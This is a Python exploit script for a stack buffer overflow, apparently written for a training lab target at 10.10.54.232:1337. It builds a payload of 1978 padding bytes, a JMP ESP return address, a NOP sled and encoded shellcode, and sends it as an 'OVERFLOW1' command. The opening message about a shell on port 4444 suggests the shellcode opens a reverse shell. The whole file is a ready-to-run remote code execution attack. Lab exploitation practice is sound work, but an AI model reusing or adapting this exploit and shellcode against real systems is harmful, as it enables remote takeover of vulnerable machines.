import socket
import sys
import time


print("[+] Nani! Final exploit check your shell at 4444....\n")

buff = "A" * 1978
eip = "\xaf\x11\x50\x62" #0x625011AF JMP ESP pointer address

nops = "\x90" * 20

shellcode =  b""
shellcode += b"\xba\xad\x13\xdd\x9f\xda\xcd\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e"
shellcode += b"\x03\xfd\x1d\x3f\x6a\x01\xc9\x3d\x95\xf9\x0a"
shellcode += b"\x22\x1f\x1c\x3b\x62\x7b\x55\x6c\x52\x0f\x3b"
shellcode += b"\x81\x19\x5d\xaf\x12\x6f\x4a\xc0\x93\xda\xac"
shellcode += b"\xef\x24\x76\x8c\x6e\xa7\x85\xc1\x50\x96\x45"
shellcode += b"\x14\x91\xdf\xb8\xd5\xc3\x88\xb7\x48\xf3\xbd"
shellcode += b"\x82\x50\x78\x8d\x03\xd1\x9d\x46\x25\xf0\x30"
shellcode += b"\xdc\x7c\xd2\xb3\x31\xf5\x5b\xab\x56\x30\x15"
shellcode += b"\x40\xac\xce\xa4\x80\xfc\x2f\x0a\xed\x30\xc2"
shellcode += b"\x52\x2a\xf6\x3d\x21\x42\x04\xc3\x32\x91\x76"
shellcode += b"\x1f\xb6\x01\xd0\xd4\x60\xed\xe0\x39\xf6\x66"
shellcode += b"\xee\xf6\x7c\x20\xf3\x09\x50\x5b\x0f\x81\x57"
shellcode += b"\x8b\x99\xd1\x73\x0f\xc1\x82\x1a\x16\xaf\x65"
shellcode += b"\x22\x48\x10\xd9\x86\x03\xbd\x0e\xbb\x4e\xaa"
shellcode += b"\xe3\xf6\x70\x2a\x6c\x80\x03\x18\x33\x3a\x8b"
shellcode += b"\x10\xbc\xe4\x4c\x56\x97\x51\xc2\xa9\x18\xa2"
shellcode += b"\xcb\x6d\x4c\xf2\x63\x47\xed\x99\x73\x68\x38"
shellcode += b"\x0d\x23\xc6\x93\xee\x93\xa6\x43\x87\xf9\x28"
shellcode += b"\xbb\xb7\x02\xe3\xd4\x52\xf9\x64\xd1\xb3\x0f"
shellcode += b"\xf9\x8d\xb1\x0f\x10\x12\x3f\xe9\x78\xba\x69"
shellcode += b"\xa2\x14\x23\x30\x38\x84\xac\xee\x45\x86\x27"
shellcode += b"\x1d\xba\x49\xc0\x68\xa8\x3e\x20\x27\x92\xe9"
shellcode += b"\x3f\x9d\xba\x76\xad\x7a\x3a\xf0\xce\xd4\x6d"
shellcode += b"\x55\x20\x2d\xfb\x4b\x1b\x87\x19\x96\xfd\xe0"
shellcode += b"\x99\x4d\x3e\xee\x20\x03\x7a\xd4\x32\xdd\x83"
shellcode += b"\x50\x66\xb1\xd5\x0e\xd0\x77\x8c\xe0\x8a\x21"
shellcode += b"\x63\xab\x5a\xb7\x4f\x6c\x1c\xb8\x85\x1a\xc0"
shellcode += b"\x09\x70\x5b\xff\xa6\x14\x6b\x78\xdb\x84\x94"
shellcode += b"\x53\x5f\xa4\x76\x71\xaa\x4d\x2f\x10\x17\x10"
shellcode += b"\xd0\xcf\x54\x2d\x53\xe5\x24\xca\x4b\x8c\x21"
shellcode += b"\x96\xcb\x7d\x58\x87\xb9\x81\xcf\xa8\xeb"


payload = buff + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('10.10.54.232', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command PASS
s.send('OVERFLOW1 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()

print("\nExecution Finished!\n")
